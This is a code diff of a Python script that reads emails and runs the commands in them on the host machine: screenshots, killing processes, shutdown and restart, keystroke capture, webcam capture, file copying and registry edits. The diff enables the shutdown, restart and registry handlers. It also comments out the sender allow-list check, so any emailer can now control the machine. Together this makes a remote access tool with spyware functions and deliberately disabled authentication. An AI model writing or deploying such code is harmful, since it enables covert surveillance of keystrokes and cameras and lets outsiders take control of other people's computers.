@@ -6,11 +6,11 @@ import re
 
 from reply_screenshot import reply_screenshot
 from reply_process import reply_list_running_app, reply_stop_app
-#from reply_shutdown_restart import reply_shutdown, reply_restart
+from reply_shutdown_restart import reply_shutdown, reply_restart
 from reply_pressed_key import reply_pressed_key
 from reply_camera_capture import reply_camera_capture
 from reply_copy_file import reply_copy_file
-#from reply_registry import reply_modify_reg
+from reply_registry import reply_modify_reg
 
 import ui
 
@@ -41,8 +41,8 @@ if __name__ == '__main__':
                     
                     print(email_message['From'])
                     
-                    if email_message['From'] not in ui.mailList:
-                        continue
+                    #if email_message['From'] not in ui.mailList:
+                    #    continue
                     
                     body_message = ''
                     
@@ -61,20 +61,21 @@ if __name__ == '__main__':
                         reply_list_running_app(email_message, USERNAME, PASSWORD)
                     elif 'KILL ' in body_message:
                         try:
-                            pid = int(re.match(r'KILL (\d+)', body_message).group(0))
+                            pid = int(re.match(r'KILL (\d+)', body_message).group(1))
+                            print(f'Gui cuu {pid}')
                             reply_stop_app(email_message, USERNAME, PASSWORD, pid)
                             print(pid)
                         except:
                             pass
                     elif 'SHUTDOWN' in body_message:
-                        pass
-                        #reply_shutdown(email_message, USERNAME, PASSWORD)
+                        #pass
+                        reply_shutdown(email_message, USERNAME, PASSWORD)
                     elif 'RESET' in body_message:
-                        pass
-                        #reply_restart(email_message, USERNAME, PASSWORD)
+                        #pass
+                        reply_restart(email_message, USERNAME, PASSWORD)
                     elif 'CATCH KEYBOARD' in body_message:
                         reply_pressed_key(email_message, USERNAME, PASSWORD)
-                    elif 'WEBCAM' in body_message:
+                    elif 'VIDEO' in body_message:
                         reply_camera_capture(email_message, USERNAME, PASSWORD)
                     elif 'COPY' in body_message:
                         # Kinda lazy let just do this for now
@@ -84,13 +85,13 @@ if __name__ == '__main__':
                         if pos + 2 < len(ls):
                             reply_copy_file(email_message, USERNAME, PASSWORD, ls[pos + 1], ls[pos + 2])
                     elif 'REG' in body_message:
-                        pass
+                        # pass
                         ls = body_message.split()
                         pos = ls.index('REG')
                         
                         if pos + 3 < len(ls):
-                            pass
-                            #reply_modify_reg(email_message, USERNAME, PASSWORD, ls[pos + 1], ls[pos + 2], ls[pos + 3])
+                            # pass
+                            reply_modify_reg(email_message, USERNAME, PASSWORD, ls[pos + 1], ls[pos + 2], ls[pos + 3])
                         
                         
                     retcode, data = conn.store(num, '+FLAGS', '(\\Seen)')
